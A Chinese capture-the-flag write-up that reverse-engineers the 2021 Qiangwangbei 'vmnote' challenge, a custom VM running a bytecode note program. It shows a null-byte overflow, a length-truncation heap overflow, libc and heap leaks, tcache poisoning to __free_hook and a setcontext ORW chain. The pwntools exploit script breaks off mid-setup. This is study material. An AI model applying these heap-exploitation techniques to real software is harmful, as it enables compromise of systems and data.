> 原文链接: https://www.anquanke.com//post/id/247805 


# 从今年强网杯的一道学习vm


                                阅读量   
                                **29226**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p0.ssl.qhimg.com/t015dcd44c56a0f3f7d.png)](https://p0.ssl.qhimg.com/t015dcd44c56a0f3f7d.png)



## 概述

vm的题目在CTF的比赛中是一种很常见的题型，一般的做法都是找到其指令执行过程中自定义的指令的解释程序的一些漏洞（如溢出，offset_by_null等）在理解每条指令意义的前提下通过构造一个程序来触发漏洞实现提权。而今年的强网杯线下的一道vm题目却是更加新颖一些，他用定义了一套指令集，然后写了一个程序的来解释执行，同时他用自己定义的指令集写了一个程序实现了一个表单题。感觉有种套娃的感觉，下面我们就来分析一下这道题。需要的文件我放到了百度网盘:

> 链接: [https://pan.baidu.com/s/169bulaSJe77nttvfKcP8lQ](https://pan.baidu.com/s/169bulaSJe77nttvfKcP8lQ) 密码: fbl0



## 程序分析

### <a class="reference-link" name="%E5%88%86%E6%9E%90vm%E7%A8%8B%E5%BA%8F"></a>分析vm程序

首先我们看一下这个函数的主逻辑。函数先载入了用vm指令实现的程序，再调用vm对其解释运行。

```
void __fastcall main_func1(__int64 a1, __int64 a2)
`{`
  init2();
  load_file("note.bin");
  vm("note.bin", a2);
`}`
```

深入load_file程序我们能够发现set_data这个函数，其主要的功能就是将note.bin里面的代码code和数据data载入到内存，通过这个函数我们可以窥探这个note.bin文件的结构。

```
unsigned __int64 __fastcall set_data(int *ptr)
`{`
  signed int len1; // [rsp+14h] [rbp-1Ch]
  int len2; // [rsp+18h] [rbp-18h]
  int off1; // [rsp+1Ch] [rbp-14h]
  int off2; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  Reset();
  len1 = *ptr;
  len2 = ptr[1];
  off1 = ptr[2];
  off2 = ptr[3];
  if ( *ptr &lt; 0 || len1 &gt; 0x1FFF )
    exit1();
  if ( len2 &lt; 0 || len2 &gt; 0x1FFF )
    exit1();
  offset_check(off1, len1);
  offset_check(off2, len2);
  memcpy(&amp;code[off1], ptr + 4, len1);
  code_pos = off1;
  memcpy(&amp;data[off2], ptr + len1 + 16, len2);
  return __readfsqword(0x28u) ^ v6;
`}`
```

可以看到note.bin的结构如下，待会解析note.bin的时候会用到。

```
note.bin
`{`
len1 4B 代码段code的长度
len2 4B 数据段data的长度
off1 4B 代码段code载入的偏移
off2 4B 数据段data载入的偏移
code len1B 代码段
data len2B 数据段
`}`
```

接着我们就去逆向vm函数，看看这个vm程序的指令格式，以及它是如何解释执行的。经过一番分析，我们发现这个vm的指令集是一个CISC指令集，它有如下的指令。

```
while ( code_pos &gt;= 0 &amp;&amp; code_pos &lt;= 0x1FFF )
  `{`
    opcode = get_code();
    while ( 1 )
    `{`
      v4 = (opcode &gt;&gt; 5) &amp; 7;                   // 高3位
                                                // 
      op = opcode &amp; 0x1F;                       // 低5位
      if ( op &gt; 0x1D )
        break;
      opcode &amp;= 0x1Fu;
      switch ( op )
      `{`
        case 0uLL:                              // push
          Push();
          goto LABEL_1;
        case 1uLL:                              // mov
          a1 = v4;
          Load_reg(v4);
          goto LABEL_1;
        case 2uLL:
          change_rbp();
          goto LABEL_1;
        case 3uLL:
          a1 = v4;
          input(v4);
          goto LABEL_1;
        case 4uLL:
          leave();
          goto LABEL_1;
        case 5uLL:
          a1 = v4;
          Sub(v4);
          goto LABEL_1;
        case 6uLL:
          goto LABEL_1;
        case 7uLL:
          a1 = v4;
          Add(v4);
          goto LABEL_1;
        case 8uLL:
          a1 = v4;
          Store(v4);
          goto LABEL_1;
        case 9uLL:
          a1 = v4;
          Store_reg(v4);
          goto LABEL_1;
        case 0xAuLL:
          a1 = v4;
          Load_(v4);
          goto LABEL_1;
        case 0xBuLL:
          a1 = v4;
          Cmp(v4);
          goto LABEL_1;
        case 0xCuLL:
          exit1();
          return;
        case 0xDuLL:
          a1 = v4;
          And(v4);
          goto LABEL_1;
        case 0xEuLL:
          Dec();
          goto LABEL_1;
        case 0xFuLL:
          a1 = v4;
          Div(v4);
          goto LABEL_1;
        case 0x10uLL:
          a1 = v4;
          JMP_reg(v4);
          goto LABEL_1;
        case 0x11uLL:
          a1 = v4;
          Call(v4);
          goto LABEL_1;
        case 0x12uLL:
          Inc();
          goto LABEL_1;
        case 0x13uLL:
          a1 = v4;
          JMP(v4);
          goto LABEL_1;
        case 0x14uLL:
          Pop();
          goto LABEL_1;
        case 0x15uLL:
          a1 = v4;
          Or(v4);
          goto LABEL_1;
        case 0x16uLL:
          a1 = v4;
          Mov(v4);
          goto LABEL_1;
        case 0x17uLL:
          a1 = v4;
          output1(v4);
          goto LABEL_1;
        case 0x18uLL:
          Ret();
          goto LABEL_1;
        case 0x19uLL:                           // different
          Note(a1, a2);
          goto LABEL_1;
        case 0x1AuLL:
          Reset();
          goto LABEL_1;
        case 0x1BuLL:
          Test();
          goto LABEL_1;
        case 0x1CuLL:
          a1 = v4;
          Mul(v4);
          goto LABEL_1;
        case 0x1DuLL:
          a1 = v4;
          Xor(v4);
          goto LABEL_1;
        default:
          continue;
      `}`
    `}`
```

这个指令集的opcode用一个字节来表示，其中低5位用于表示opcode的种类，而高3位用来表示某个指令的一些属性。就拿load指令来举例子，其高3位则是用来表示存取的长度。

```
__int64 __fastcall Load_reg(int size)
`{`
  __int64 pos; // rax
  unsigned __int8 v2; // ST15_1
  unsigned __int16 v3; // ST16_2
  unsigned int v4; // ST24_4
  int i; // [rsp+18h] [rbp-18h]

  i = get_reg_num();
  pos = regs[get_reg_num()];
  switch ( size )
  `{`
    case 1:
      v2 = get_data(pos, 1);
      pos = v2;
      LOBYTE(regs[i]) = v2;//取1字节
      break;
    case 2:
      v3 = get_data(pos, 2);
      pos = v3;
      LOWORD(regs[i]) = v3;//取2字节
      break;
    case 3:
      v4 = get_data(pos, 3);
      pos = v4;
      LODWORD(regs[i]) = v4;//取4字节
      break;
    case 4:
      pos = get_data(pos, 4);//取8字节
      regs[i] = pos;
      break;
  `}`
  return pos;
`}`
```

我们发现一条特殊的指令note，这条指令就会根据参数的不同实现了不同的功能。这很明显是note是一个传统的表单，这道题将它嵌入到自己的vm指令集当中。note的前3个功能和生成随机数相关，后面的指令则是维护一个note结构，3是添加一个note结构，4是删除note结构，5是将data段上的某个字符串转化为long int类型的数，6是向某个地址输入数据，7则是输出数据。

```
while ( 2 )
  `{`
    if ( LODWORD(regs[0]) &lt;= 7 )
    `{`
      switch ( LODWORD(regs[0]) )
      `{`
        case 0uLL:
          regs[0] = time(reg1);
          break;
        case 1uLL:
          srand(reg1);
          break;
        case 2uLL:
          regs[0] = rand();
          break;
        case 3uLL:
          regs[0] = add_note(reg1);
          break;
        case 4uLL:
          delete_note(reg1);
          break;
        case 5uLL:
          pos = reg1;
          check_bond(reg1);
          regs[0] = atol(&amp;data[pos]);           // get_data
          break;
        case 6uLL:                              // 漏洞这里len会截断32位
          buf = reg1;
          nbytes = *&amp;len;
          if ( *&amp;len &gt; 0LL )
          `{`
            if ( find_and_check(reg1, len) )
            `{`
              cn = read(0, buf, nbytes);
              if ( cn &gt; 0 &amp;&amp; buf[cn - 1] == '\n' )
                buf[cn - 1] = 0;
            `}`
          `}`
          break;
        case 7uLL:                              // show
          bufa = reg1;
          v3 = strlen(reg1);
          if ( find_and_check(bufa, v3) )
            printf("content: %s\n", bufa);
          break;
        default:
          continue;
      `}`
    `}`
    break;
  `}`
```

### <a class="reference-link" name="%E5%88%86%E6%9E%90note.bin%E7%A8%8B%E5%BA%8F"></a>分析note.bin程序

因为程序运行的时候note.bin的逻辑，因此需要知道note.bin的程序的意义。因此第一步我们就需要对note.bin进行反汇编，根据我们之前的分析我们写出一个脚本disasm.py来将其转化成汇编程序(这里程序写好了放在文件包里面，需要的可以参考)。因为没办法反编译，我们就只能对着汇编来看这个程序的逻辑。

**<a class="reference-link" name="%E7%BB%95%E8%BF%87passcode"></a>绕过passcode**

我们是这运行一下这个程序，发现无法直接进入note的主逻辑，需要填写passcode。那么接下来就手撸程序的汇编指令。

```
root@38b5d32d43ad:/CTF/qwb/2021/xx/vmnote# ./vmnote
challenge 224366538
passcode:
```

耐心的分析这个汇编代码（就是按照这call的函数地址一个个搜：`{`），可以搜到了刚刚这一步的逻辑（我给了点注释，注释写在了代码的后面），这里它对输入的passcode和生成的随机数（challenge后面那串）做了检查check。

```
0xc5    push    reg11
0xc7    mov    reg11,reg12
0xca    sub    reg12,#0x60
0xd4    mov    reg0,#0x1000
0xde    call    #0x6a8
//puts(0x1000)
0xe3    call    #0x6b
//note(2)
0xe8    and    reg0,#0xfffffff
0xf2    store    reg0,mem[reg12]
0xf5    output    dword reg0
//output(rand())
0xf7    mov    reg0,#0xa
0x101    output    byte reg0
//output('\n')
0x103    mov    reg0,#0x100c
0x10d    call    #0x6a8
//puts(0x100c)
0x112    mov    reg0,reg12
0x115    add    reg0,#0x10
0x11f    mov    reg1,#0x30
0x129    call    #0x5ef
//read(passcode,0x30)
0x12e    mov    reg0,reg12
0x131    add    reg0,#0x10//input addr
0x13b    load    reg1,mem[reg12]//store random
0x13e    call    #0x413
//check()
0x143    leave
0x144    ret
```

我们来看看它是如何检查的。check做了如下三个检查：
<li>检查输入的长度是否大于`0x11`
</li>
<li>检查`s0[0x11]-0x12345678==random`
</li>
1. 对`前0x11个字节`做了`call #0x6cf`这个检查
```
//check(s0,s1)
//s0 is input
//s1 is random
0x413    push    reg11
0x415    mov    reg11,reg12
0x418    sub    reg12,#0x60
0x422    store    reg0,qword mem[reg12]
0x425    mov    reg0,reg12
0x428    add    reg0,#0x8
0x432    store    reg1,qword mem[reg0]
0x435    load    reg0,qword mem[reg12]
0x438    call    #0x654
//strlen(s0)
0x43d    cmp    reg0,#0x11
0x447    ja    #0x451
0x44c    jmp    #0x49a
//len(s0) &gt; 0x11 ?
0x451    load    reg0,qword mem[reg12]
0x454    add    reg0,#0x11
0x45e    call    #0x95
//note(5) atol
0x463    sub    reg0,#0x12345678
0x46d    mov    reg1,reg12
0x470    add    reg1,#0x8
0x47a    load    reg1,qword mem[reg1]
0x47d    cmp    reg1,reg0
0x480    je    #0x48a
0x485    jmp    #0x49a
//s0[0x11]-0x12345678 == random ?
0x48a    load    reg0,qword mem[reg12]
0x48d    call    #0x6cf
0x492    test    reg0,reg0
0x495    jne    #0x4a9
0x49a    mov    reg0,#0x1018
0x4a4    call    #0x769
0x4a9    leave
0x4aa    ret
```

再看看0x6cf，其实就是一个数据表的比对操作。成功了就返回0否则返回1。其如何比对的，我可以大致写一下这个东西的伪代码大家就明白了

```
uchar s0[0x11];//输入的前0x11个字节
uchar key[0x11];// 从data+0x101f开始的11个字节
uchar table[...];// 从data+0x1120开始的数据表
for(int i=0;i&lt;0x11;i++)
`{`
    if( table[s0[i]] != key[i] )
        return 0;
`}`
return 1;
```

利用gdb从内村中dump下来key和table的数据，就能够绕过passcode了。

```
table = b''
table += p64(0x6eb86077ab94b3da)+p64(0xb54c2e5fa59a5dc0)
table += p64(0x3cc348a8e7b9ef62)+p64(0xc9d9e6db081f4316)
table += p64(0xf603fb7d3d025c38)+p64(0xe5593013d886beb0)
table += p64(0xb10451c2099193d0)+p64(0xcffa0720ec71d541)
table += p64(0x5e31c87f8592cc55)+p64(0x78ba4737f5a321df)
table += p64(0x409719252b3eaefe)+p64(0x588cf1e1a7844efc)
table += p64(0x0d2d7ad7d3a1908f)+p64(0xa6e0ddbd69350e64)
table += p64(0x791e23ce57ea9beb)+p64(0x4d12e367064baa28)
table += p64(0x76226fc12c7233af)+p64(0x11d6bcc6f289ee34)
table += p64(0xa08a4a8b3abb563f)+p64(0xf9b4000c5a63536a)

key = p64(0x58b1230458d793d0)+p64(0x5123d0ead0d5931e)+b'\x58'

p.recvuntil('challenge ')
r = int(p.recvuntil('\n')[:-1])
print("random", r)
check_num = 0x12345678+r
p.recvuntil("passcode:")

payload = b''
for i in range(0x11):
    payload += p8(table.index(key[i:i+1]))
payload += str(check_num).encode()
p.sendline(payload)
```

<a class="reference-link" name="note%E8%A1%A8%E5%8D%95%E5%88%86%E6%9E%90"></a>**note表单分析**

经过以上的分析，我们成功绕过检查后终于进入到note的表单界面。此时显现的5个功能的逻辑仍然需要我们去看一看note的反汇编的代码。

```
[DEBUG] Received 0x1d bytes:
    b'challenge 58769985\n'
    b'passcode: '
random 58769985
[DEBUG] Sent 0x1b bytes:
    b'01d_6u7_v190r0u5_364189881\n'
[*] Paused (press any to continue)
[DEBUG] Received 0x3f bytes:
    b'----menu----\n'
    b'1. new\n'
    b'2. show\n'
    b'3. edit\n'
    b'4. delete\n'
    b'5. exit\n'
    b'choice&gt;&gt; '
```

主程序的代码还是比较容易找到的，非常的清晰。程序会在data用一段空间来存储申请的note的地址，然后有如下的功能来对note进行操作。更加具体的大家可以仔细看看每个函数对应的汇编(asm文件)。
<li>new函数根据idx和size创建note，但是有限制
<ol>
1. 0&lt;size&lt;=0x60
1. 0&lt;idx&lt;=4
```
// main
0x145    push    reg11
0x147    mov    reg11,reg12
0x14a    mov    reg0,#0x1132
0x154    call    #0x6a8
//menu()
0x159    call    #0x629
//get_choice()
0x15e    cmp    reg0,#0x1
0x168    je    #0x1ae
0x16d    cmp    reg0,#0x2
0x177    je    #0x1b8
0x17c    cmp    reg0,#0x3
0x186    je    #0x1c2
0x18b    cmp    reg0,#0x4
0x195    je    #0x1cc
0x19a    cmp    reg0,#0x5
0x1a4    je    #0x1d6
0x1a9    jmp    #0x14a
//table
0x1ae    call    #0x26a
//new
0x1b3    jmp    #0x14a
0x1b8    call    #0x33d
//show
0x1bd    jmp    #0x14a
0x1c2    call    #0x37b
//edit
0x1c7    jmp    #0x14a
0x1cc    call    #0x3d5
//dlt
0x1d1    jmp    #0x14a
0x1d6    leave
0x1d7    ret
```



## 漏洞分析与利用

### <a class="reference-link" name="%E5%9C%B0%E5%9D%80%E6%B3%84%E6%BC%8F"></a>地址泄漏

在note程序的表单的new功能中在vm中调用`add_note`来实现。整个过程中都没有对chunk的数据来进行清空，因此可以通过show功能来输出表单中残留的地址。

```
void *__fastcall add_note(size_t size)
`{`
  void *data; // [rsp+18h] [rbp-8h]

  data = malloc(size);
  if ( check_chunk(data) )
    exit(0);
  write_struct(data, size);
  return data;
`}`
_QWORD *__fastcall write_struct(__int64 chunk_ptr, int size)
`{`
  _QWORD *ptr; // rax

  ptr = malloc(0x18uLL);
  *ptr = chunk_ptr;
  ptr[2] = chunk_list;
  *(ptr + 2) = size;
  chunk_list = ptr;
  return ptr;
`}`
```

在尝试中，我申请了0x60大小的基本块之后输出其中残留的内容，能够找到一个libc上的地址，而且经过几次尝试发现是稳定的。于是这样我们就能够获得libc的地址(意外的收获！)。

```
p.sendlineafter('choice&gt;&gt; ', '1')
p.sendlineafter("idx: ", str(0))
p.sendlineafter("size: ", str(0x60))
p.sendafter("content: ", b'\xff')
show(0)
p.recvuntil("content: ")
libc = u64(p.recvuntil("\n")[:-1].ljust(8, b'\x00')) - 0x1ebbff
print("libc:", hex(libc))
```

这是输出：

```
[DEBUG] Received 0x3a bytes:
    00000000  63 6f 6e 74  65 6e 74 3a  20 [ff 2b d1  21 f5 7f] 0a  │cont│ent:│ ·+·│!···│
    00000010  2d 2d 2d 2d  6d 65 6e 75  2d 2d 2d 2d  0a 31 2e 20  │----│menu│----│·1. │
    00000020  6e 65 77 0a  32 2e 20 73  68 6f 77 0a  33 2e 20 65  │new·│2. s│how·│3. e│
    00000030  64 69 74 0a  34 2e 20 64  65 6c                     │dit·│4. d│el│
    0000003a
libc: 0x7ff521b27000
```

接着要的到堆的地址就需要将堆块先释放到tcache中在申请出来，这样就能得到残留的fd的地址（堆地址）。

```
new(0, size=0x30)
new(1, size=0x30)
new(2, size=0x30)
dlt(2)
dlt(1)
dlt(0)

p.sendlineafter('choice&gt;&gt; ', '1')
p.sendlineafter("idx: ", str(0))
p.sendlineafter("size: ", str(0x30))
p.sendafter("content: ", b'\xff')
show(0)
p.recvuntil("content: ")
heap = u64(p.recvuntil("\n")[:-1].ljust(8, b'\x00'))
print("heap:", hex(heap))
```

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%BD%8D"></a>漏洞定位

这道题目比赛的时候第一天没有出来，有很大一部分原因是我笃信漏洞在add_note和del_note中。但是很不幸这程序的note的申请和释放都很正确，并没有造成double free这样的漏洞。

回到正题这道题目我觉得出的挺好的一点就是，这道题目有两个漏洞，一个漏洞出在解释程序中，一个漏洞在note.bin的程序中，需要结合这两者才能劫持程序流拿到flag。接下来逐个分析这两个漏洞

<a class="reference-link" name="note.bin%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E"></a>**note.bin中的漏洞**

note.bin程序中的诸如idx等参数的输入是通过vm的一些指令来实现的。具体的是通过0x629这个函数来实现的。0x629如下所示，它传入0x60个0x5ef这个函数(表示输入的长度)。在reg中reg11表示rbp，reg12表示的是rsp，**值得注意的它申请的栈空间正好也是0x60**。

```
0x629    push    reg11
0x62b    mov    reg11,reg12
0x62e    sub    reg12,#0x60
0x638    mov    reg0,reg12
0x63b    mov    reg1,#0x60
0x645    call    #0x5ef
0x64a    mov    reg0,reg12
0x64d    call    #0x95
0x652    leave
0x653    ret
```

0x5ef中有明显的溢出当，当输入的长度正好是0x60的时候，它就会向0x60的位置的写入一个字节的`\x00`（**offset_by_null!!**）。结合之前调用的它的0x629就会发现我们是向栈上输入内容的，而栈上和这个地址相隔0x60的地方正好存储着栈帧的地址，这就意味着栈帧低位被置空，**如果此时能够控制对应的栈上的内容就能够劫持vm程序流。**

```
//read(addr,size)
//溢出overflow offset by null
0x5ef    xor    reg6,reg6
0x5f2    xor    reg7,reg7
0x5f5    input    reg7
0x5f7    cmp    reg7,#0xa
0x601    je    #0x615
0x606    store    reg7,mem[reg0]
0x609    inc    reg0
0x60b    inc    reg6
0x60d    cmp    reg6,reg1
0x610    jb    #0x5f5
0x615    mov    reg7,#0x0
0x61f    store    reg7,mem[reg0]
0x622    mov    reg0,reg1
0x625    sub    reg0,reg6
0x628    ret
```

测试一下，真的能造成程序的一些崩溃

```
[DEBUG] Sent 0x2 bytes:
    b'6\n'
[DEBUG] Received 0x21 bytes:
    00000000  ea ee d6 e0  e1 e9 e1 e9  d4 9e 7f 7c  af 9e a8 a8  │····│····│···|│····│
    00000010  94 90 97 96  e5 3b 1b 17  de a4 5b ad  ad 32 31 72  │····│·;··│··[·│·21r│
    00000020  18                                                  │·│
    00000021
[*] Process './vmnote' stopped with exit code 0 (pid 121)
[DEBUG] Received 0x4f7 bytes:
    00000000  ba ba 33 da  f4 2c fc d7  0a 97 cb 1c  70 9f 42 55  │··3·│·,··│····│p·BU│
    00000010  99 4d 8c 62  9f 16 ae 11  ab 52 ef f4  e1 8b 04 66  │·M·b│····│·R··│···f│
    00000020  42 3f fd 71  7f f4 2c b4  fe 82 47 5a  01 8f bc f1  │B?·q│··,·│··GZ│····│
    00000030  f1 63 da 2b  98 c3 51 af  01 be 74 95  82 dd dd d6  │·c·+│··Q·│··t·│····│
    00000040  12 07 3b c2  69 dc 53 13  97 a7 63 75  e2 da a6 94  │··;·│i·S·│··cu│····│
    00000050  66 09 85 b3  2b 12 50 64  d0 3d e9 7b  d0 1a d3 d2  │f···│+·Pd│·=·`{`│····│
    00000060  21 91 93 f0  ad 47 18 44  ad 13 2d 8f  8c d4 97 f9  │!···│·G·D│··-·│····│
    00000070  8a 3d ae 79  7e 0b 44 f8  5f 9c 33 a9  1a 57 f3 71  │·=·y│~·D·│_·3·│·W·q│
    00000080  32 6e f9 2d  1a 34 68 a4  39 a0 f6 ee  c6 b3 63 7c  │2n·-│·4h·│9···│··c|│
    00000090  9f 18 2f 60  22 32 7a 61  77 68 58 4a  b8 7b b3 5e  │··/`│"2za│whXJ│·`{`·^│
    000000a0  a0 24 f0 7f  eb 85 1d 4d  e4 d5 64 e9  b2 3d 7a 91  │·$··│···M│··d·│·=z·│
    000000b0  95 09 42 09  c0 77 b2 be  a5 5c 64 97  fa 74 f5 37  │··B·│·w··│·\d·│·t·7│
    000000c0  a9 2e 7a f4  17 d3 2b 96  5b 1d 8f 51  40 e4 7f 47  │·.z·│··+·│[··Q│@··G│
    000000d0  a6 03 ed cc  af 6f 1d 50  47 5b f0 80  27 8b ce 09  │····│·o·P│G[··│'···│
    000000e0  2b 9c b2 99  85 35 b5 08  b8 82 b0 fa  16 a1 c1 80  │+···│·5··│····│····│
    000000f0  58 18 fd eb  29 4c 62 76  57 99 5d bd  2e b7 dd ec  │X···│)Lbv│W·]·│.···│
```

<a class="reference-link" name="%E8%A7%A3%E9%87%8A%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E"></a>**解释程序中的漏洞**

这里其实还挺明显的，第一天就是硬是没有看出来。这里nbytes是size_t的类型是64bit，而len是int类型的有32位。len会截断传入的长度数据。这里看汇编可能会比ida的反编译来的明显。因此适当的构造长度数据就会造成堆溢出(`1&lt;&lt;32+0x30`)。

```
case 6uLL:                              // 漏洞这里len会截断32位
          buf = reg1;
          nbytes = *&amp;len;
          if ( *&amp;len &gt; 0LL )
          `{`
            if ( find_and_check(reg1, len) )
            `{`
              cn = read(0, buf, nbytes);
              if ( cn &gt; 0 &amp;&amp; buf[cn - 1] == '\n' )
                buf[cn - 1] = 0;
            `}`
          `}`
          break;
/*
mov     [rbp+nbytes], rax
cmp     [rbp+nbytes], 0
jle     loc_2288
mov     rax, [rbp+nbytes]
mov     edx, eax
mov     rax, [rbp+buf]
mov     esi, edx
mov     rdi, rax
call    find_and_check
*/
```

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

首先劫持vm程序的控制流，通过构造note(6)的输入数据，造成堆溢出。观察note(6)发现需要传入reg0和reg1。前者表示输入的地址，后者表示输入的长度。

```
note(6)
0xa4    mov    reg2,reg1
0xa7    mov    reg1,reg0
0xaa    mov    reg0,#0x6
0xb4    note
0xb5    ret
```

为了控制reg0和reg1需要寻找gadget。由于可以控制栈所以一下简单的gadget能够控制输入参数。然后布置栈内容`pay = p64(0x6ca)+p64(heap)+p64((1 &lt;&lt; 32)+0x10)+p64(0xa4)+p64(0x14a)`，最后返回主逻辑。

```
0x6ca    pop    reg0
0x6cc    pop    reg1
0x6ce    ret
```

利用溢出劫持tacahe，从而将fd改为`__free_hook`，申请到`__free_hook`的堆块。

这题开了沙箱需要进行orw

```
root@38b5d32d43ad:/CTF/qwb/2021/xx/vmnote# seccomp-tools dump ./vmnote
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x06 0x00 0x00 0x00000000  return KILL
```

在libc中可以找到非常有用的gadget：`*0x0000000000154930: mov rdx, qword ptr[rdi + 8];mov qword ptr[rsp], rax;call qword ptr[rdx + 0x20]*`配合`setcontext+61`的位置就能够劫持rsp从而劫持程序流实现orw。

```
pwndbg&gt; x/10i &amp;setcontext+61
   0x7f8be7a580dd &lt;setcontext+61&gt;:      mov    rsp,QWORD PTR [rdx+0xa0]
   0x7f8be7a580e4 &lt;setcontext+68&gt;:      mov    rbx,QWORD PTR [rdx+0x80]
   0x7f8be7a580eb &lt;setcontext+75&gt;:      mov    rbp,QWORD PTR [rdx+0x78]
   0x7f8be7a580ef &lt;setcontext+79&gt;:      mov    r12,QWORD PTR [rdx+0x48]
   0x7f8be7a580f3 &lt;setcontext+83&gt;:      mov    r13,QWORD PTR [rdx+0x50]
   0x7f8be7a580f7 &lt;setcontext+87&gt;:      mov    r14,QWORD PTR [rdx+0x58]
   0x7f8be7a580fb &lt;setcontext+91&gt;:      mov    r15,QWORD PTR [rdx+0x60]
   0x7f8be7a580ff &lt;setcontext+95&gt;:      test   DWORD PTR fs:0x48,0x2
   0x7f8be7a5810b &lt;setcontext+107&gt;:     je     0x7f8be7a581c6 &lt;setcontext+294&gt;
   0x7f8be7a58111 &lt;setcontext+113&gt;:     mov    rsi,QWORD PTR [rdx+0x3a8]
   ...
```

因为vm的栈是随机的因此需要进行一定的爆破，我本地大概6到7次成功一次。

```
[*] Switching to interactive mode
[DEBUG] Received 0x30 bytes:
    00000000  68 61 63 6b  21 21 21 21  21 2b 04 00  00 00 00 00  │hack│!!!!│!+··│····│
    00000010  00 00 00 73  a0 05 00 00  07 03 04 13  a3 05 00 00  │···s│····│····│····│
    00000020  05 03 04 12  06 0b 06 02  33 b6 05 00  00 12 00 12  │····│····│3···│····│
    00000030
hack!!!!!+\x04\x00\x00\x00\x00\xa0\x05\x00\x03\x13\x05\x00\x03\x12\x0b3\xb6\x05\x00\x00[*] Got EOF while reading in interactive
```



## EXP

```
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
local = 1
if local == 1:
    p = process('./vmnote')
    lb = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    rdi, rsi, rdx, rax = 0x26b72, 0x27529, 0x11c371, 0
    syscall = 0
    gadgets = []
else:
    p = remote('', 00)
    lb = ELF('libc.so.6')
    rdi, rsi, rdx, rax = 0x26b72, 0x27529, 0x11c371, 0
    gadgets = []
    syscall = 0

# cmd = ''
# cmd += 'b *$rebase(0x3826)\n'
# cmd += 'b *$rebase(0x207f)\n'
# cmd += 'b *$rebase(0x2184)\n'
# p = gdb.debug(["./vmnote"], cmd)

table = b''
table += p64(0x6eb86077ab94b3da)+p64(0xb54c2e5fa59a5dc0)
table += p64(0x3cc348a8e7b9ef62)+p64(0xc9d9e6db081f4316)
table += p64(0xf603fb7d3d025c38)+p64(0xe5593013d886beb0)
table += p64(0xb10451c2099193d0)+p64(0xcffa0720ec71d541)
table += p64(0x5e31c87f8592cc55)+p64(0x78ba4737f5a321df)
table += p64(0x409719252b3eaefe)+p64(0x588cf1e1a7844efc)
table += p64(0x0d2d7ad7d3a1908f)+p64(0xa6e0ddbd69350e64)
table += p64(0x791e23ce57ea9beb)+p64(0x4d12e367064baa28)
table += p64(0x76226fc12c7233af)+p64(0x11d6bcc6f289ee34)
table += p64(0xa08a4a8b3abb563f)+p64(0xf9b4000c5a63536a)

key = p64(0x58b1230458d793d0)+p64(0x5123d0ead0d5931e)+b'\x58'

p.recvuntil('challenge ')
r = int(p.recvuntil('\n')[:-1])
print("random", r)
check_num = 0x12345678+r
p.recvuntil("passcode:")

payload = b''
for i in range(0x11):
    payload += p8(table.index(key[i:i+1]))
payload += str(check_num).encode()
p.sendline(payload)

def new(idx, con='aaaa', size=4):
    p.sendlineafter('choice&gt;&gt; ', '1')
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("size: ", str(size))
    p.sendlineafter("content: ", con)


def show(idx):
    p.sendlineafter('choice&gt;&gt; ', '2')
    p.sendlineafter("idx: ", str(idx))


def dlt(idx):
    p.sendlineafter('choice&gt;&gt; ', '4')
    p.sendlineafter("idx: ", str(idx))



p.sendlineafter('choice&gt;&gt; ', '1')
p.sendlineafter("idx: ", str(0))
p.sendlineafter("size: ", str(0x60))
p.sendafter("content: ", b'\xff')
show(0)
p.recvuntil("content: ")
libc = u64(p.recvuntil("\n")[:-1].ljust(8, b'\x00')) - 0x1ebbff
print("libc:", hex(libc))

dlt(0)
new(0, size=0x30)
new(1, size=0x30)
new(2, size=0x30)
dlt(2)
dlt(1)
dlt(0)

p.sendlineafter('choice&gt;&gt; ', '1')
p.sendlineafter("idx: ", str(0))
p.sendlineafter("size: ", str(0x30))
p.sendafter("content: ", b'\xff')
show(0)
p.recvuntil("content: ")
heap = u64(p.recvuntil("\n")[:-1].ljust(8, b'\x00'))
print("heap:", hex(heap))

heap = heap-0xff+0x10
pay = p64(0x6ca)+p64(heap)+p64((1 &lt;&lt; 32)+0x10)+p64(0xa4)+p64(0x14a)
p.sendlineafter('choice&gt;&gt; ', p64(0x888)+pay*2 + p64(0x888))
# gdb.attach(p)
p.sendlineafter('choice&gt;&gt; ', '5')

fh = libc+lb.sym['__free_hook']
context = libc+lb.sym['setcontext']+61
print("context", hex(context))

# 0x0000000000154930: mov rdx, qword ptr[rdi + 8];mov qword ptr[rsp], rax;call qword ptr[rdx + 0x20]

o = lb.sym['open']+libc
r = lb.sym['read']+libc
w = lb.sym['write']+libc
rdi += libc
rsi += libc
rdx += libc
gadgets = libc+0x154930
flag_addr = heap
buf = heap+0x500

